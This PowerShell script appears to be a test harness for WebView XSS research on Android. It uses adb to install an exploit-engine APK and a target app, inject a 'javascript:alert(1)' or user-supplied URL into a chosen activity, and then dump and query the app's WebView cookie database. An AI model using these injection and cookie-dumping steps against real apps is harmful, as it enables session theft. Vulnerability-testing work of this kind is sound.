# If(-not(Get-InstalledModule PSSQLite -ErrorAction silentlycontinue)){
#     Install-Module PSSQLite -Confirm:$False -Force
# }
# Import-Module PSSQLite
function attackXSS {
    param (
        $class_options
    )
    Clear-Host
    for($i = 0; $i -lt $class_options.count; $i++){
        Write-Host "$($i): $($class_options[$i])"
    }
    $selection = Read-Host -Prompt "Enter the number of class to attack"
    $className = $class_options[$selection]
    $DevaaFolder = "/usr/local/codeql-home/codeql-repo/java/ql/test/query-tests/security/Devaa"
    function Show-Menu {
        param (
            [string]$Title = 'Attacks List'
        )
        Write-Host "================ $Title ================"
        
        Write-Host "1: Enter URL to query"
        Write-Host "2: javascript:alert\(1\)"
        Write-Host "3: Press '3' for this option."
        Write-Host "Q: Press 'Q' to quit."
    }

    # $query = Read-Host -Prompt 'Enter an XSS attack query'

    # Write-Output $class_options
    adb install -g "$($DevaaFolder)/exploit_engine/app-debug.apk"
    adb install -g "$($DevaaFolder)/testRepo/app/build/outputs/apk/debug/app-debug.apk"
    $packageString = aapt dump badging "$($DevaaFolder)/testRepo/app/build/outputs/apk/debug/app-debug.apk" | grep "package:\ name"
    $packageName = $packageString.Split("'")[1]
    Write-Host $packageName
    # $allOutput = adb install -g app-debug.apk 2>&1
    # $stderr = $allOutput | ?{ $_ -is [System.Management.Automation.ErrorRecord] }
    # $stdout = $allOutput | ?{ $_ -isnot [System.Management.Automation.ErrorRecord]
# javascript:alert\(1\)

    # adb shell am start -n "app.swag.testcasedriver/app.swag.testcasedriver.HTMLBasedEncodingXSSActivity" --es uri1 "https://www.zoho.com" --es className "com.vuldroid.application.YoutubeViewer" --es packageName "com.vuldroid.application" --es domain "https://zoho.com/"
    do
    {
        Show-Menu
        $selection = Read-Host "Please make a selection"
        switch ($selection)
        {
        '1' {
            $payload = Read-Host -Prompt 'Enter URL check will be at domain level?'
        } '2' {
            $payload = "javascript:alert\(1\)"
        } '3' {
            'You chose option #3'
        }
        }
        if($selection -ne 'q'){
            adb shell am start -n "app.swag.testcasedriver/app.swag.testcasedriver.HTMLBasedEncodingXSSActivity" --es uri1 "$($payload)" --es className "$($className)" --es packageName "$($packageName)" --es domain "$($payload)"
            Start-Sleep -s 10
            adb shell input keyevent KEYCODE_HOME
            adb shell am force-stop "app.swag.testcasedriver"
                    # WILL probably have to find all Cookie named locations and cat wildacrd their content unless something else found
            adb shell "run-as $($packageName) cat /data/data/$($packageName)/app_webview/Default/Cookies" > Cookies
            Start-Sleep -s 10
            $Database = "$($DevaaFolder)/Cookies"
            $query = "SELECT COUNT(*) FROM cookies WHERE host_key LIKE '%$($payload.Split(".")[1])%'"
            Write-Host $query
            # sqlite3 Cookies "select * from cookies where host_key like '%zoho%'"
            # sqlite3 $Database $query
            Invoke-SqliteQuery -Query $query -DataSource $Database
        }
        # pause
    }
    while ($selection -ne 'q')
# adb.exe shell "sqlite3 $(filename) 'select * from cookies'"
# TODO
# adb shell "sqlite3 /data/data/com.vuldroid.application/YoutubeViewer/Cookies 'select * from cookies'"
# TODO rooted device    
# adb pull "/data/data/com.vuldroid.application/databases"

    }

    # adb shell am start -n com.vuldroid.application/com.vuldroid.application.YoutubeViewer -d "https://picsum.photos/500"
